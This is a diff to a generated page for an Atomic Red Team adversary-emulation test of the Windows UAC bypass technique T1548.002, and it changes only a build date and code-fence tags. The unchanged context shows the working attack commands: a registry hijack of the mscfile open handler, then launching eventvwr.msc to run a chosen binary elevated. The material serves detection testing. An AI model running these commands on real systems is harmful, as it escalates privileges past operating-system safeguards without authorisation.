@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1548.002"
 attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "5073adf8-9a50-4bd9-b298-a9bd2ead8af9"
@@ -51,14 +51,14 @@ Upon execution command prompt should be launched with administrative privileges.
 
 ### Command
 
-```commandprompt
+```cmd
 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
 cmd.exe /c eventvwr.msc
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
 ```
 
